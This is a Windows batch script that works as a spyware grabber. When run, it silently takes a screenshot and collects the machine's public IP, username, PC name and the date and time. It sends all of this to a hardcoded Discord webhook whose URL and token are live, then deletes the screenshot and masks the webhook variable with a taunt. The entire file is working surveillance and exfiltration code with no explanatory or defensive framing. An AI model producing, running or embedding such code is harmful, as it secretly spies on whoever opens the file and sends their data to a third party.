��&cls
��
@echo off
set "webhook=https://discord.com/api/webhooks/1257436567140565075/Ba8FogyFvUTbJE1k904qTvmChrmPNmRTqyQQfqwW_QdaEuz21bO3msVSRRuLk8zkhOJ0"
powershell -c "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('^{PRTSC}'); Start-Sleep -Milliseconds 500; $img = [System.Windows.Forms.Clipboard]::GetImage(); $img.Save('%temp%\84621_59037621345078019234_5678901.jpg', [System.Drawing.Imaging.ImageFormat]::Png);}" >nul
for /f %%i in ('curl -s https://api.ipify.org') do set ip=%%i
for /f "tokens=*" %%i in ('whoami') do set "info=%%i"
set "info=%info:\=\nUsername: %"
for /f "tokens=1-3 delims=-" %%a in ('date /t') do (set "d=%%c-%%a-%%b")
for /f "tokens=1-2 delims=:" %%a in ('time /t') do (set "t=%%a:%%b")
curl -k -H "Content-Type: multipart/form-data" -F "file=@%temp%\84621_59037621345078019234_5678901.jpg" -F "payload_json={\"embeds\":[{\"title\":\"Information\",\"description\":\"Someone has opened your application:\n\nScript Name: %~nx0\nIP: %ip%\nPC Name: %info%\n\nDate: %date%\nTime: %t%\n\nScreenshot:\",\"color\":7506394,\"image\":{\"url\":\"attachment://84621_59037621345078019234_5678901.jpg\"}}]}" %webhook% >nul
if exist "%temp%\84621_59037621345078019234_5678901.jpg" del "%temp%\84621_59037621345078019234_5678901.jpg" >nul
set "webhook=No webhook found. Exit code: Get good loser ez"